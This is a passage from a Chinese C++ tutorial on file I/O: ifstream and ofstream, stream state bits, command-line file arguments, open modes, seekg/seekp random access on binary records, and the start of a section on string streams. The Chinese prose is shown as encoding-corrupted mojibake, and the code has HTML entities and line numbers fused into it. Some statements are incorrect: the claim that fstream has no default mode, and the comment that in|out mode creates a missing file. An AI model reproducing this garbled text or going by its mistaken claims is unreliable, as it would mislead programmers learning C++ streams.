iostreamï¼Œå¯ä»¥åŒæ—¶æ”¯æŒæ–‡ä»¶çš„è¯»å–å’Œå†™å…¥ã€‚ è¿™äº›æ–‡ä»¶æµç±»çš„ä½¿ç”¨æ–¹å¼ä¸ cin å’Œ cout éå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒä»¬ç»§æ‰¿äº†ç›¸åŒçš„åŸºç±»å¹¶æ”¯æŒç›¸åŒçš„æ“ä½œç¬¦ï¼ˆå¦‚ &lt;&lt;, &gt;&gt;) å’Œæ–¹æ³•ï¼ˆå¦‚ get(), getline(), write(), read()ï¼‰ã€‚ 17.4.1 ç®€å•çš„æ–‡ä»¶ I/Oè¿›è¡Œæ–‡ä»¶ I/O çš„åŸºæœ¬æ­¥éª¤ï¼š åŒ…å«å¤´æ–‡ä»¶: #include &lt;fstream&gt;ã€‚ åˆ›å»ºæµå¯¹è±¡: åˆ›å»ºä¸€ä¸ª ifstream (ç”¨äºè¯»å–) æˆ– ofstream (ç”¨äºå†™å…¥) æˆ– fstream (ç”¨äºè¯»å†™) å¯¹è±¡ã€‚ å…³è”æ–‡ä»¶: å°†æµå¯¹è±¡ä¸ä¸€ä¸ªå…·ä½“çš„æ–‡ä»¶å…³è”èµ·æ¥ã€‚è¿™å¯ä»¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶é€šè¿‡æ„é€ å‡½æ•°å®Œæˆï¼Œä¹Ÿå¯ä»¥ä¹‹åä½¿ç”¨ open() æ–¹æ³•ã€‚ æ£€æŸ¥æ˜¯å¦æˆåŠŸæ‰“å¼€: ä½¿ç”¨ is_open() æ–¹æ³•æˆ–æ£€æŸ¥æµå¯¹è±¡çš„çŠ¶æ€æ¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚ è¿›è¡Œ I/O æ“ä½œ: ä½¿ç”¨ &lt;&lt;, &gt;&gt;, get(), getline(), write(), read() ç­‰æ–¹æ³•è¯»å†™æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨ cin å’Œ cout ä¸€æ ·ã€‚ å…³é—­æ–‡ä»¶: ä½¿ç”¨ close() æ–¹æ³•å…³é—­æ–‡ä»¶ï¼Œæ–­å¼€æµå¯¹è±¡ä¸æ–‡ä»¶çš„å…³è”ã€‚é‡è¦: å½“æ–‡ä»¶æµå¯¹è±¡ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸï¼‰ï¼Œå…¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ close()ï¼Œå› æ­¤æ˜¾å¼è°ƒç”¨ close() é€šå¸¸ä¸æ˜¯å¿…éœ€çš„ï¼Œä½†æœ‰æ—¶ä¸ºäº†æ˜ç¡®æˆ–æ£€æŸ¥å…³é—­çŠ¶æ€å¯ä»¥è¿™æ ·åšã€‚ ç¤ºä¾‹ï¼šå†™å…¥æ–‡ä»¶ 12345678910111213141516171819202122232425262728293031#include &lt;fstream&gt; // åŒ…å« fstream å¤´æ–‡ä»¶#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 1. åˆ›å»º ofstream å¯¹è±¡å¹¶é€šè¿‡æ„é€ å‡½æ•°å…³è”æ–‡ä»¶ // é»˜è®¤ä»¥è¾“å‡ºæ¨¡å¼ (ios_base::out) æ‰“å¼€ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹ std::ofstream outFile(&quot;mydata.txt&quot;); // 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ if (!outFile.is_open()) &#123; // æˆ–è€… if (!outFile) std::cerr &lt;&lt; &quot;Error opening file for writing!&quot; &lt;&lt; std::endl; return 1; &#125; // 3. å‘æ–‡ä»¶å†™å…¥æ•°æ® (ç±»ä¼¼ cout) std::string name = &quot;Alice&quot;; int age = 25; double score = 95.5; outFile &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; outFile &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; outFile &lt;&lt; &quot;Score: &quot; &lt;&lt; score &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Data written to mydata.txt&quot; &lt;&lt; std::endl; // 4. å…³é—­æ–‡ä»¶ (å¯é€‰ï¼Œææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨) // outFile.close(); return 0; // outFile åœ¨è¿™é‡Œç¦»å¼€ä½œç”¨åŸŸï¼Œææ„å‡½æ•°è°ƒç”¨ close()&#125; ç¤ºä¾‹ï¼šè¯»å–æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 1. åˆ›å»º ifstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶ // é»˜è®¤ä»¥è¾“å…¥æ¨¡å¼ (ios_base::in) æ‰“å¼€ std::ifstream inFile(&quot;mydata.txt&quot;); // 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ if (!inFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening file for reading!&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;Reading data from mydata.txt:&quot; &lt;&lt; std::endl; // 3. ä»æ–‡ä»¶è¯»å–æ•°æ® (ç±»ä¼¼ cin) std::string line; // é€è¡Œè¯»å– while (getline(inFile, line)) &#123; // ä½¿ç”¨å…¨å±€ getline è¯»å–æ•´è¡Œåˆ° string std::cout &lt;&lt; line &lt;&lt; std::endl; &#125; // æˆ–è€…ï¼Œå¦‚æœçŸ¥é“æ ¼å¼ï¼Œå¯ä»¥åƒ cin ä¸€æ ·è¯»å– /* std::string label1, name, label2, label3; int age; double score; inFile &gt;&gt; label1 &gt;&gt; name &gt;&gt; label2 &gt;&gt; age &gt;&gt; label3 &gt;&gt; score; if (inFile) &#123; // æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸ std::cout &lt;&lt; &quot;Read Name: &quot; &lt;&lt; name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Read Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Read Score: &quot; &lt;&lt; score &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Error reading data format.&quot; &lt;&lt; std::endl; &#125; */ // 4. å…³é—­æ–‡ä»¶ (å¯é€‰) // inFile.close(); return 0;&#125; 17.4.2 æµçŠ¶æ€æ£€æŸ¥å’Œ is_open() is_open(): æ–‡ä»¶æµå¯¹è±¡æä¾› is_open() æˆå‘˜å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€å¹¶ä¸æµå…³è”ã€‚åœ¨å°è¯•è¿›è¡Œä»»ä½• I/O æ“ä½œä¹‹å‰ï¼ŒåŠ¡å¿…è°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚ æµçŠ¶æ€ä½: æ–‡ä»¶æµå¯¹è±¡ä¹Ÿå…·æœ‰ä¸ cin ç›¸åŒçš„çŠ¶æ€ä½ (goodbit, eofbit, failbit, badbit)ã€‚ å¦‚æœ open() å¤±è´¥ï¼Œæµå¯¹è±¡çš„çŠ¶æ€é€šå¸¸ä¼šè®¾ç½®ä¸º failbitã€‚å› æ­¤ï¼Œif (!outFile) æˆ– if (!inFile) ä¹Ÿå¯ä»¥ç”¨æ¥æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚ åœ¨è¯»å–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°æ–‡ä»¶æœ«å°¾ï¼Œä¼šè®¾ç½® eofbitã€‚ å¦‚æœè¯»å–çš„æ•°æ®æ ¼å¼ä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼Œè¯•å›¾å°†æ–‡æœ¬è¯»å…¥ intï¼‰ï¼Œä¼šè®¾ç½® failbitã€‚ å¦‚æœå‘ç”Ÿåº•å±‚ I/O é”™è¯¯ï¼Œä¼šè®¾ç½® badbitã€‚ å¯ä»¥ä½¿ç”¨ good(), eof(), fail(), bad() æ¥æ£€æŸ¥è¿™äº›çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨ clear() æ¥æ¸…é™¤é”™è¯¯çŠ¶æ€ï¼ˆå¦‚æœå¯æ¢å¤ï¼‰ã€‚ 17.4.3 æ‰“å¼€å¤šä¸ªæ–‡ä»¶ä¸€ä¸ªç¨‹åºå¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶ï¼Œåªéœ€ä¸ºæ¯ä¸ªæ–‡ä»¶åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶æµå¯¹è±¡å³å¯ã€‚ 12345678910111213141516171819202122232425262728#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::ifstream sourceFile(&quot;input.txt&quot;); std::ofstream destFile(&quot;output.txt&quot;); if (!sourceFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening input.txt&quot; &lt;&lt; std::endl; return 1; &#125; if (!destFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening output.txt&quot; &lt;&lt; std::endl; return 1; // sourceFile ä¼šè‡ªåŠ¨å…³é—­ &#125; std::string line; while (getline(sourceFile, line)) &#123; // å¤„ç† line ... destFile &lt;&lt; &quot;Copied: &quot; &lt;&lt; line &lt;&lt; std::endl; // å†™å…¥åˆ°ç›®æ ‡æ–‡ä»¶ &#125; std::cout &lt;&lt; &quot;File copy finished.&quot; &lt;&lt; std::endl; // sourceFile å’Œ destFile ä¼šåœ¨ main ç»“æŸæ—¶è‡ªåŠ¨å…³é—­ return 0;&#125; 17.4.4 å‘½ä»¤è¡Œå¤„ç†æŠ€æœ¯é€šå¸¸ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨è¿è¡Œç¨‹åºæ—¶é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æ¥æŒ‡å®šè¦å¤„ç†çš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¯å°†æ–‡ä»¶åç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚main å‡½æ•°å¯ä»¥æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°ï¼š 123int main(int argc, char *argv[]) &#123; // ...&#125; argc (argument count): ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„æ•°é‡ï¼ˆåŒ…æ‹¬ç¨‹åºæœ¬èº«çš„åç§°ï¼‰ã€‚ argv (argument vector): ä¸€ä¸ªæŒ‡å‘ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆchar*ï¼‰çš„æŒ‡é’ˆæ•°ç»„ã€‚ argv[0] é€šå¸¸æ˜¯ç¨‹åºæœ¬èº«çš„åç§°ã€‚ argv[1] æ˜¯ç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚ argv[2] æ˜¯ç¬¬äºŒä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œä¾æ­¤ç±»æ¨ã€‚ argv[argc] æ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆ (nullptr)ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt; // ç”¨äºå­˜å‚¨å‚æ•°int main(int argc, char *argv[]) &#123; // æ£€æŸ¥å‚æ•°æ•°é‡æ˜¯å¦æ­£ç¡® if (argc != 3) &#123; // éœ€è¦ç¨‹åºå + è¾“å…¥æ–‡ä»¶å + è¾“å‡ºæ–‡ä»¶å std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;input_file&gt; &lt;output_file&gt;&quot; &lt;&lt; std::endl; return 1; &#125; // argv[1] æ˜¯è¾“å…¥æ–‡ä»¶å, argv[2] æ˜¯è¾“å‡ºæ–‡ä»¶å std::ifstream sourceFile(argv[1]); std::ofstream destFile(argv[2]); if (!sourceFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening input file: &quot; &lt;&lt; argv[1] &lt;&lt; std::endl; return 1; &#125; if (!destFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening output file: &quot; &lt;&lt; argv[2] &lt;&lt; std::endl; return 1; &#125; // ... (æ–‡ä»¶å¤„ç†é€»è¾‘ï¼Œä¾‹å¦‚å¤åˆ¶) ... char ch; while (sourceFile.get(ch)) &#123; destFile.put(ch); &#125; std::cout &lt;&lt; &quot;Processed &quot; &lt;&lt; argv[1] &lt;&lt; &quot; to &quot; &lt;&lt; argv[2] &lt;&lt; std::endl; return 0;&#125; ç¼–è¯‘åï¼Œå¯ä»¥è¿™æ ·è¿è¡Œï¼š./my_program data.in results.out 17.4.5 æ–‡ä»¶æ¨¡å¼åœ¨æ‰“å¼€æ–‡ä»¶æ—¶ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ– open() æ–¹æ³•ï¼‰ï¼Œå¯ä»¥æŒ‡å®šæ–‡ä»¶æ¨¡å¼ (file mode) æ¥æ§åˆ¶æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ã€‚æ–‡ä»¶æ¨¡å¼æ˜¯å®šä¹‰åœ¨ ios_base ç±»ä¸­çš„å¸¸é‡ï¼Œç±»å‹ä¸º openmode (ä¸€ç§ä½æ©ç ç±»å‹)ã€‚ å¸¸ç”¨çš„æ–‡ä»¶æ¨¡å¼æ ‡å¿—ï¼š ios_base::in: ä»¥è¯»å–æ¨¡å¼æ‰“å¼€ (ifstream é»˜è®¤)ã€‚ ios_base::out: ä»¥å†™å…¥æ¨¡å¼æ‰“å¼€ (ofstream é»˜è®¤)ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œæ¸…ç©ºå…¶å†…å®¹ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚ ios_base::app (append): ä»¥è¿½åŠ æ¨¡å¼æ‰“å¼€ã€‚å†™å…¥æ“ä½œå°†åœ¨æ–‡ä»¶æœ«å°¾è¿›è¡Œã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚æ­¤æ¨¡å¼ä¸‹é€šå¸¸éšå« ios_base::outã€‚ ios_base::ate (at end): æ‰“å¼€æ–‡ä»¶å¹¶å°†åˆå§‹ä½ç½®å®šä½åˆ°æ–‡ä»¶æœ«å°¾ã€‚ä½†ä»å¯ä»¥åœ¨æ–‡ä»¶ä¸­çš„ä»»ä½•ä½ç½®å†™å…¥ï¼ˆä¸ app ä¸åŒï¼Œapp å¼ºåˆ¶å†™å…¥åˆ°æœ«å°¾ï¼‰ã€‚ ios_base::binary: ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬æ¨¡å¼ã€‚åœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸‹ï¼Œä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ \\n æˆ–å›è½¦ç¬¦ \\rï¼‰è¿›è¡Œè½¬æ¢ã€‚è¿™å¯¹äºè¯»å†™éæ–‡æœ¬æ–‡ä»¶ï¼ˆå¦‚å›¾åƒã€å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æˆ–éœ€è¦ç²¾ç¡®å­—èŠ‚æ§åˆ¶çš„æƒ…å†µè‡³å…³é‡è¦ã€‚ ios_base::trunc (truncate): å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œæ¸…ç©ºå…¶å†…å®¹ã€‚ios_base::out æ¨¡å¼é»˜è®¤åŒ…å«æ­¤è¡Œä¸ºã€‚ å¯ä»¥ä½¿ç”¨æŒ‰ä½æˆ–è¿ç®—ç¬¦ (|) æ¥ç»„åˆå¤šä¸ªæ¨¡å¼æ ‡å¿—ã€‚ open() æ–¹æ³•: é™¤äº†æ„é€ å‡½æ•°ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ open() æ–¹æ³•æ‰“å¼€æ–‡ä»¶ã€‚ 123456789ofstream outFile;outFile.open(&quot;config.cfg&quot;, ios_base::out | ios_base::trunc); // æ˜¾å¼æŒ‡å®šè¦†ç›–å†™å…¥ifstream dataFile;dataFile.open(&quot;image.bin&quot;, ios_base::in | ios_base::binary); // ä»¥äºŒè¿›åˆ¶è¯»å–æ¨¡å¼æ‰“å¼€fstream ioFile;// ä»¥è¯»å†™æ¨¡å¼æ‰“å¼€ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œä¸æ¸…ç©ºå†…å®¹ioFile.open(&quot;log.dat&quot;, ios_base::in | ios_base::out | ios_base::binary); é»˜è®¤æ¨¡å¼: ifstream é»˜è®¤æ¨¡å¼æ˜¯ ios_base::inã€‚ ofstream é»˜è®¤æ¨¡å¼æ˜¯ ios_base::out | ios_base::truncã€‚ fstream æ²¡æœ‰é»˜è®¤æ¨¡å¼ï¼Œå¿…é¡»æ˜¾å¼æŒ‡å®šã€‚ 17.4.6 éšæœºå­˜å–é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡ä»¶æµæ˜¯æŒ‰é¡ºåºè¯»å–æˆ–å†™å…¥çš„ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬éœ€è¦ç›´æ¥è·³è½¬åˆ°æ–‡ä»¶ä¸­çš„ç‰¹å®šä½ç½®è¿›è¡Œè¯»å†™ï¼Œè¿™ç§°ä¸º**éšæœºå­˜å– (Random Access)**ã€‚ æ–‡ä»¶æµç»´æŠ¤ç€å†…éƒ¨çš„ä½ç½®æŒ‡é’ˆï¼š è¾“å…¥æŒ‡é’ˆ (Get Pointer): istream (åŠ ifstream, fstream) ç»´æŠ¤ï¼ŒæŒ‡ç¤ºä¸‹ä¸€æ¬¡è¯»å–æ“ä½œå°†ä»å“ªé‡Œå¼€å§‹ã€‚ è¾“å‡ºæŒ‡é’ˆ (Put Pointer): ostream (åŠ ofstream, fstream) ç»´æŠ¤ï¼ŒæŒ‡ç¤ºä¸‹ä¸€æ¬¡å†™å…¥æ“ä½œå°†åœ¨å“ªé‡Œè¿›è¡Œã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ¥æ“ä½œè¿™äº›ä½ç½®æŒ‡é’ˆï¼š seekg(offset, direction) (seek get): ç§»åŠ¨è¾“å…¥æŒ‡é’ˆã€‚ seekp(offset, direction) (seek put): ç§»åŠ¨è¾“å‡ºæŒ‡é’ˆã€‚ offset: ä¸€ä¸ªæ•´æ•°å€¼ï¼ˆç±»å‹é€šå¸¸æ˜¯ streamoffï¼‰ï¼Œè¡¨ç¤ºè¦ç§»åŠ¨çš„å­—èŠ‚æ•°ã€‚å¯ä»¥æ˜¯æ­£æ•°ï¼ˆå‘æ–‡ä»¶æœ«å°¾ç§»åŠ¨ï¼‰æˆ–è´Ÿæ•°ï¼ˆå‘æ–‡ä»¶å¼€å¤´ç§»åŠ¨ï¼‰ã€‚ direction: ä¸€ä¸ªæšä¸¾å€¼ï¼ˆç±»å‹ seekdirï¼Œå®šä¹‰åœ¨ ios_base ä¸­ï¼‰ï¼ŒæŒ‡å®š offset çš„å‚è€ƒç‚¹ï¼š ios_base::beg: ä»æ–‡ä»¶å¼€å¤´è®¡ç®—åç§»é‡ã€‚ ios_base::cur: ä»æ–‡ä»¶å½“å‰ä½ç½®è®¡ç®—åç§»é‡ã€‚ ios_base::end: ä»æ–‡ä»¶æœ«å°¾è®¡ç®—åç§»é‡ï¼ˆæ­¤æ—¶ offset é€šå¸¸ä¸ºè´Ÿæ•°æˆ–é›¶ï¼‰ã€‚ tellg() (tell get): è¿”å›è¾“å…¥æŒ‡é’ˆçš„å½“å‰ä½ç½®ï¼ˆç±»å‹é€šå¸¸æ˜¯ streamposï¼Œå¯ä»¥è½¬æ¢ä¸ºæ•´æ•°ï¼‰ã€‚ tellp() (tell put): è¿”å›è¾“å‡ºæŒ‡é’ˆçš„å½“å‰ä½ç½®ã€‚ æ³¨æ„: éšæœºå­˜å–é€šå¸¸åœ¨äºŒè¿›åˆ¶æ¨¡å¼ (ios_base::binary) ä¸‹ä½¿ç”¨æ›´å¯é ï¼Œå› ä¸ºæ–‡æœ¬æ¨¡å¼ä¸‹çš„å­—ç¬¦è½¬æ¢å¯èƒ½ä¼šå¹²æ‰°ç²¾ç¡®çš„å­—èŠ‚å®šä½ã€‚ ç¤ºä¾‹ï¼šéšæœºè®¿é—®æ–‡ä»¶ å‡è®¾æœ‰ä¸€ä¸ªå­˜å‚¨è®°å½•çš„æ–‡ä»¶ records.datï¼Œæ¯æ¡è®°å½•å›ºå®šå¤§å°ä¸º sizeof(Record)ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;vector&gt;struct Record &#123; int id; char name[20]; double value;&#125;;int main() &#123; const char* filename = &quot;records.dat&quot;; const size_t recordSize = sizeof(Record); // --- å†™å…¥ä¸€äº›è®°å½• --- std::ofstream outFile(filename, std::ios::out | std::ios::binary | std::ios::trunc); if (!outFile) &#123; /* error check */ return 1; &#125; std::vector&lt;Record&gt; records = &#123; &#123;1, &quot;Rec A&quot;, 10.1&#125;, &#123;2, &quot;Rec B&quot;, 20.2&#125;, &#123;3, &quot;Rec C&quot;, 30.3&#125;, &#123;4, &quot;Rec D&quot;, 40.4&#125; &#125;; for (const auto&amp; rec : records) &#123; outFile.write(reinterpret_cast&lt;const char*&gt;(&amp;rec), recordSize); &#125; outFile.close(); // --- éšæœºè¯»å–å’Œä¿®æ”¹è®°å½• --- std::fstream ioFile(filename, std::ios::in | std::ios::out | std::ios::binary); if (!ioFile) &#123; /* error check */ return 1; &#125; Record tempRec; // 1. è¯»å–ç¬¬ä¸‰æ¡è®°å½• (ç´¢å¼•ä¸º 2) long position = 2 * recordSize; ioFile.seekg(position, std::ios::beg); // å®šä½åˆ°ç¬¬ä¸‰æ¡è®°å½•çš„å¼€å¤´ if (ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize)) &#123; std::cout &lt;&lt; &quot;Read record at index 2: ID=&quot; &lt;&lt; tempRec.id &lt;&lt; &quot;, Name=&quot; &lt;&lt; tempRec.name &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to read record at index 2.&quot; &lt;&lt; std::endl; &#125; // 2. ä¿®æ”¹ç¬¬äºŒæ¡è®°å½• (ç´¢å¼•ä¸º 1) if (ioFile.good()) &#123; // ç¡®ä¿æµçŠ¶æ€è‰¯å¥½ position = 1 * recordSize; ioFile.seekp(position, std::ios::beg); // å®šä½è¾“å‡ºæŒ‡é’ˆåˆ°ç¬¬äºŒæ¡è®°å½•å¼€å¤´ // è¯»å–åŸå§‹è®°å½• (å¯é€‰ï¼Œå¦‚æœéœ€è¦åŸºäºåŸå§‹å€¼ä¿®æ”¹) // ioFile.seekg(position, std::ios::beg); // ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize); // å‡†å¤‡æ–°æ•°æ®å¹¶å†™å…¥ Record updatedRec = &#123;2, &quot;Record B Updated&quot;, 25.5&#125;; ioFile.write(reinterpret_cast&lt;const char*&gt;(&amp;updatedRec), recordSize); if (ioFile.fail()) &#123; std::cerr &lt;&lt; &quot;Failed to write updated record at index 1.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Updated record at index 1.&quot; &lt;&lt; std::endl; &#125; &#125; // 3. è·å–æ–‡ä»¶å¤§å° ioFile.seekg(0, std::ios::end); // å®šä½åˆ°æ–‡ä»¶æœ«å°¾ long fileSize = ioFile.tellg(); // è·å–å½“å‰ä½ç½® (å³æ–‡ä»¶å¤§å°) std::cout &lt;&lt; &quot;File size: &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Number of records: &quot; &lt;&lt; fileSize / recordSize &lt;&lt; std::endl; ioFile.close(); return 0;&#125; è¿™ä¸ªä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ seekg å’Œ seekp å®šä½åˆ°æ–‡ä»¶ä¸­çš„ç‰¹å®šå­—èŠ‚ä½ç½®ï¼Œå¹¶ä½¿ç”¨ read å’Œ write è¿›è¡ŒäºŒè¿›åˆ¶æ•°æ®çš„è¯»å†™ã€‚ 17.5 å†…æ ¸æ ¼å¼åŒ–åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬è®¨è®ºçš„ I/O æ“ä½œéƒ½æ˜¯å°†æ•°æ®å‘é€åˆ°å¤–éƒ¨è®¾å¤‡ï¼ˆå¦‚å±å¹• coutï¼‰æˆ–æ–‡ä»¶ï¼ˆofstreamï¼‰ï¼Œæˆ–è€…ä»å¤–éƒ¨è®¾å¤‡ï¼ˆcinï¼‰æˆ–æ–‡ä»¶ï¼ˆifstreamï¼‰è¯»å–æ•°æ®ã€‚ä½†æœ‰æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨å†…å­˜ä¸­å¯¹æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ï¼Œå°†å„ç§ç±»å‹çš„æ•°æ®ï¼ˆæ•°å­—ã€å­—ç¬¦ç­‰ï¼‰è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…åè¿‡æ¥ï¼Œä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‰ç‰¹å®šæ ¼å¼è§£æå‡ºå„ç§ç±»å‹çš„æ•°æ®ã€‚ C++ æ ‡å‡†åº“é€šè¿‡ &lt;sstream&gt; å¤´æ–‡ä»¶æä¾›äº†å­—ç¬¦ä¸²æµ (String Streams) ç±»æ¥å®ç°è¿™ç§å†…æ ¸æ ¼å¼åŒ– (In-memory Formatting) æˆ– å†…å­˜ä¸­çš„ I/Oã€‚ &lt;sstream&gt; å®šä¹‰äº†ä¸‰ä¸ªä¸»è¦çš„ç±»ï¼š ostringstream (output string stream): ç»§æ‰¿è‡ª ostreamã€‚å®ƒå…è®¸ä½ åƒä½¿ç”¨ cout ä¸€æ ·ï¼Œä½¿ç”¨æ’å…¥è¿ç®—ç¬¦ (&lt;&lt;) å’Œå…¶ä»– ostream æ–¹æ³•å°†å„ç§ç±»å‹çš„æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªå†…éƒ¨çš„å­—ç¬¦ä¸²ç¼“å†²åŒºä¸­ã€‚ä¹‹åå¯ä»¥è·å–è¿™ä¸ªæ ¼å¼åŒ–å¥½çš„å­—ç¬¦ä¸²ã€‚ istringstream (input string stream): ç»§æ‰¿è‡ª istreamã€‚å®ƒå…è®¸ä½ å°†ä¸€ä¸ªå·²æœ‰çš„ std::string æˆ– C é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºæ•°æ®æºï¼Œç„¶ååƒä½¿ç”¨ cin ä¸€æ ·ï¼Œä½¿ç”¨æå–è¿ç®—ç¬¦ (&gt;&gt;) å’Œå…¶ä»– istream æ–¹æ³•ä»ä¸­è¯»å–ï¼ˆè§£æï¼‰æ•°æ®ã€‚ stringstream: ç»§æ‰¿è‡ª iostreamã€‚å®ƒç»“åˆäº† ostringstream å’Œ istringstream çš„åŠŸèƒ½ï¼Œå…è®¸å¯¹åŒä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºè¿›è¡Œè¯»å–å’Œå†™å…¥æ“ä½œã€‚ è¿™äº›å­—ç¬¦ä¸²æµç±»çš„è¡Œä¸ºä¸æ–‡ä»¶æµæˆ–æ§åˆ¶å°æµéå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒä»¬å…±äº«ç›¸åŒçš„åŸºç±»å’Œæ¥å£ã€‚ä½ å¯ä»¥ä½¿ç”¨åŒæ ·çš„æ ¼å¼åŒ–æ“çºµç¬¦ï¼ˆå¦‚ setw, setprecision, fixed, hex ç­‰ï¼‰æ¥æ§åˆ¶å­—ç¬¦ä¸²æµä¸­çš„æ ¼å¼ã€‚ ä½¿ç”¨ ostringstream è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºå½“ä½ éœ€è¦å°†ä¸åŒç±»å‹çš„æ•°æ®ç»„åˆæˆä¸€ä¸ªæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²æ—¶ï¼Œostringstream éå¸¸æœ‰ç”¨ã€‚ æ­¥éª¤: åŒ…å«å¤´æ–‡ä»¶ #include &lt;sstream&gt;ã€‚ åˆ›å»ºä¸€ä¸ª ostringstream å¯¹è±¡ã€‚ åƒä½¿ç”¨ cout ä¸€æ ·ï¼Œä½¿ç”¨ &lt;&lt; å°†æ•°æ®æ’å…¥åˆ°æµä¸­ã€‚å¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–æ“çºµç¬¦ã€‚ ä½¿ç”¨ str() æˆå‘˜å‡½æ•°è·å–æµå†…éƒ¨ç¼“å†²åŒºä¸­ç§¯ç´¯çš„ std::string å‰¯æœ¬ã€‚ ç¤ºä¾‹: 